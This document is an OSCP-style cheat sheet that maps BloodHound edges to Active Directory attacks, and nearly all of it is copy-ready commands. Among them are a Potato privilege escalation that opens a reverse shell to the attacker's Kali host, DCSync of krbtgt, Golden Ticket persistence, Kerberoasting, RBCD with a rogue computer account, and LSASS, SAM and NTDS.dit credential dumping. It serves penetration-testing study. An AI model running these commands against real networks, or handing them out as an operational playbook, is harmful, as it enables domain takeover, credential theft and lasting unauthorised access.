# Windows AD Attack Cheat Sheet (OSCP)

Organized by **BloodHound edge / privilege** — you see the edge, you look up the attack.
The single most important rule: **what an edge unlocks depends on the TARGET's object type.**
`GenericAll` over a *user* ≠ over a *computer* ≠ over a *group*.

Placeholders: `<DOM>`=domain (meridian.local), `<DC>`=DC IP, `<USER>`/`<PASS>`/`<HASH>`
= the account you control, `<TARGET>`=the object the edge points at.

Tunnel note: everything runs from Kali. If the target is behind a pivot, route it with
ligolo first; Kerberos (`-k`) needs the hostname + `/etc/hosts` + clock sync to the DC.

---

## Quick edge → attack lookup

| BloodHound edge | Target type | Primary attack |
|---|---|---|
| `GenericAll` | user | reset password / targeted Kerberoast / Shadow Creds |
| `GenericAll` | group | add yourself to the group |
| `GenericAll` | computer | RBCD / Shadow Creds / read LAPS |
| `GenericWrite` | user | targeted Kerberoast / Shadow Creds (NOT full reset) |
| `GenericWrite` | computer | RBCD / Shadow Creds |
| `WriteDACL` | any | grant yourself GenericAll, then above |
| `WriteOwner` | any | make yourself owner → WriteDACL → GenericAll |
| `ForceChangePassword` | user | reset the password (no old pw needed) |
| `AddMember` / `Self` | group | add yourself to the group |
| `AllowedToDelegate` | user/computer | constrained delegation (S4U) |
| `AddKeyCredentialLink` | user/computer | Shadow Credentials |
| `AddSelf` | group | add yourself to the group |
| `ReadLAPSPassword` | computer | read local admin pw from LAPS |
| `ReadGMSAPassword` | gMSA | read the service account password |
| `DCSync` / `GetChanges`+`GetChangesAll` | domain | secretsdump the whole domain |
| `Owns` | any | WriteOwner semantics |

Kerberos-only wins (no edge needed): **Kerberoast** (any SPN), **AS-REP roast**
(no-preauth users). Privilege-based: **SeImpersonate**, **SeBackupPrivilege**,
**SeLoadDriver**, unconstrained delegation.

---

## GenericAll / GenericWrite over a USER

**Option 1 — targeted Kerberoast** (works for GenericWrite AND GenericAll; stealthier):

```bash
python3 targetedKerberoast.py -v -d <DOM> -u <USER> -H <HASH> \
  --request-user <TARGET> --dc-host <DC>
# writes a fake SPN, requests the TGS, prints $krb5tgs$, removes the SPN
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Manual SPN version:
```bash
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> \
  set object <TARGET> servicePrincipalName -v "fake/svc"
impacket-GetUserSPNs <DOM>/<USER> -hashes :<HASH> -dc-ip <DC> \
  -request-user <TARGET> -outputfile tgs.txt
# clean up afterward:
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> \
  set object <TARGET> servicePrincipalName -v ""
```

**Option 2 — force-reset the password** (GenericAll / ForceChangePassword only; LOUD, breaks the account):
```bash
net rpc password "<TARGET>" "Newpass123!" -U "<DOM>/<USER>%<PASS>" -S <DC>
# or with a hash:
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> set password <TARGET> 'Newpass123!'
# or:
pth-net rpc password "<TARGET>" "Newpass123!" -U "<DOM>/<USER>%<HASH>" -S <DC>
```

**Option 3 — Shadow Credentials** (GenericAll/GenericWrite; needs AD CS/PKINIT; no pw reset, quiet):
```bash
pywhisker -d <DOM> -u <USER> -H <HASH> --target <TARGET> --action add
# -> <TARGET>.pfx + pfx password
python3 gettgtpkinit.py <DOM>/<TARGET> -cert-pfx <TARGET>.pfx -pfx-pass '<PFXPASS>' <TARGET>.ccache
export KRB5CCNAME=<TARGET>.ccache
python3 getnthash.py <DOM>/<TARGET> -key <AS-REP-KEY>
# -> <TARGET> NT hash; authenticate with -H or the ticket with -k
```

---

## GenericAll / GenericWrite over a COMPUTER

**Resource-Based Constrained Delegation (RBCD)** — impersonate a DA to that machine:
```bash
# 1) create a computer account you control (needs MachineAccountQuota > 0, default 10)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Evil123!' \
  -hashes :<HASH> -dc-ip <DC> '<DOM>/<USER>'
# 2) write the delegation attribute on the target computer
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write \
  -hashes :<HASH> '<DOM>/<USER>'
# 3) S4U — get a DA ticket to the target's service (cifs/host/http/ldap...)
impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate 'Administrator' \
  -dc-ip <DC> '<DOM>/EVIL$:Evil123!'
# 4) use it
export KRB5CCNAME='Administrator@cifs_<TARGET_FQDN>@<REALM>.ccache'
impacket-psexec -k -no-pass <TARGET_FQDN>
```

**Shadow Credentials over a computer** — same pywhisker flow, `--target <COMPUTER>$`.

---

## WriteDACL / WriteOwner / Owns (over ANY object)

Escalate the weaker edge into GenericAll, then use the user/computer/group section above.

```bash
# WriteOwner -> make yourself the owner
impacket-owneredit -action write -new-owner '<USER>' -target '<TARGET>' \
  '<DOM>/<USER>' -hashes :<HASH> -dc-ip <DC>
# then grant yourself full control (WriteDACL)
impacket-dacledit -action write -rights FullControl -principal '<USER>' \
  -target '<TARGET>' '<DOM>/<USER>' -hashes :<HASH> -dc-ip <DC>
# bloodyAD equivalents:
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> set owner <TARGET> <USER>
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> add genericAll <TARGET> <USER>
```

---

## Group control (GenericAll / AddMember / AddSelf / Self over a GROUP)

Add yourself (or a controlled user) to the group:
```bash
net rpc group addmem "<TARGET_GROUP>" "<USER>" -U "<DOM>/<USER>%<PASS>" -S <DC>
# or:
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> add groupMember "<TARGET_GROUP>" <USER>
# Windows-side:
net group "<TARGET_GROUP>" <USER> /add /domain
```
High-value groups to look for: Domain Admins, Enterprise Admins, Backup Operators,
Account Operators, DnsAdmins, Remote Management Users, Server Operators.

---

## Kerberoast (any account with an SPN — no edge needed)

```bash
impacket-GetUserSPNs <DOM>/<USER>:'<PASS>' -dc-ip <DC> -request -outputfile kerb.txt
# or via nxc:
nxc ldap <DC> -u <USER> -p '<PASS>' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## AS-REP Roast (users with "do not require preauth")

```bash
impacket-GetNPUsers <DOM>/ -usersfile users.txt -dc-ip <DC> -no-pass -outputfile asrep.txt
# authenticated (finds the flagged users for you):
nxc ldap <DC> -u <USER> -p '<PASS>' --asreproast asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## AllowedToDelegate (constrained delegation, S4U)

```bash
impacket-getST -spn '<SERVICE>/<TARGET_FQDN>' -impersonate 'Administrator' \
  '<DOM>/<CONTROLLED_ACCT>:<PASS>' -dc-ip <DC>
export KRB5CCNAME='Administrator@<SERVICE>_<TARGET_FQDN>@<REALM>.ccache'
impacket-psexec -k -no-pass <TARGET_FQDN>
```

## Unconstrained delegation (you control a box with it)

```bash
# monitor for / coerce a DC to authenticate, capture its TGT
impacket-krbrelayx -hashes :<COMPUTER_HASH>       # listens for the TGT
# coerce with printerbug / petitpotam from another shell:
python3 printerbug.py <DOM>/<USER>:'<PASS>'@<DC_TO_COERCE> <YOUR_HOST>
```

---

## ReadLAPSPassword (computer)

```bash
nxc ldap <DC> -u <USER> -p '<PASS>' --module laps
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M laps      # some versions
# or:
bloodyAD --host <DC> -d <DOM> -u <USER> -H <HASH> get object <TARGET>$ \
  --attr ms-Mcs-AdmPwd
# -> cleartext local Administrator password; log in with it (--local-auth)
```

## ReadGMSAPassword (gMSA account)

```bash
nxc ldap <DC> -u <USER> -p '<PASS>' --gmsa
# or:
python3 gMSADumper.py -u <USER> -p '<PASS>' -d <DOM>
# -> NT hash of the gMSA; use with -H
```

---

## Privilege-based escalations (from a shell, `whoami /priv`)

**SeImpersonate** (web/db/service shells) — Potato → SYSTEM:
```powershell
.\SigmaPotato.exe "whoami"
.\SigmaPotato.exe --revshell <KALI_IP> 4444
# alternatives: GodPotato-NET4.exe -cmd "cmd /c whoami"  |  PrintSpoofer64.exe -i -c cmd
```

**SeBackupPrivilege** (Backup Operators) — copy locked NTDS.dit / hives:
```powershell
# diskshadow snapshot to dodge the NTDS lock
Set-Content C:\Windows\Temp\sc.txt "set context persistent nowriters`nadd volume c: alias sv`ncreate`nexpose %sv% z:"
diskshadow /s C:\Windows\Temp\sc.txt
robocopy /b z:\Windows\NTDS . NTDS.dit     # /b = backup mode = uses SeBackupPrivilege
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```
```bash
# offline extraction on Kali
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

**SeLoadDriver**, **SeManageVolume**, **AlwaysInstallElevated**, unquoted service paths —
enumerate with winPEAS; each has a known local-priv path.

---

## Credential dumping (once admin on a box)

```bash
# LSASS — get logged-on users' creds (hunt for a Domain Admin session!)
nxc smb <IP> -u <USER> -p '<PASS>' -M lsassy
nxc smb <IP> -u Administrator -H <LOCAL_HASH> --local-auth -M lsassy
# SAM + LSA + cached
nxc smb <IP> -u <USER> -p '<PASS>' --sam --lsa
# from a SYSTEM shell, offline:
reg save HKLM\SAM sam.save & reg save HKLM\SYSTEM system.save & reg save HKLM\SECURITY security.save
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

---

## DCSync — the endgame (replication rights: DA, or GenericAll on the domain object)

```bash
impacket-secretsdump '<DOM>/<USER>:<PASS>'@<DC> -just-dc
impacket-secretsdump -hashes :<HASH> '<DOM>/<USER>'@<DC> -just-dc
# just krbtgt (for a Golden Ticket) or just Administrator:
impacket-secretsdump '<DOM>/<USER>:<PASS>'@<DC> -just-dc-user krbtgt
impacket-secretsdump '<DOM>/<USER>:<PASS>'@<DC> -just-dc-user Administrator
```

## Using what you dumped

```bash
# Pass-the-Hash
nxc smb <IP> -u Administrator -H <NTHASH>
impacket-psexec -hashes :<NTHASH> '<DOM>/Administrator'@<IP>
evil-winrm -i <IP> -u Administrator -H <NTHASH>

# Golden Ticket (persistence, from krbtgt hash)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOM> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DC_FQDN>
```

---

## The decision flow

```
land on a box  ->  whoami /priv   (SeImpersonate? SeBackup?)  ->  privesc to SYSTEM/admin
             ->  dump creds (LSASS + SAM)  ->  spray everywhere
             ->  BloodHound: mark owned, read OUTBOUND edges
             ->  match edge TYPE + target TYPE to the section above
             ->  execute the one attack that edge unlocks
             ->  repeat until an account has replication rights  ->  DCSync  ->  done
```

**When BloodHound shows an edge, the object type on the RECEIVING end decides the attack.**
Read the edge direction and the target type before picking a tool.
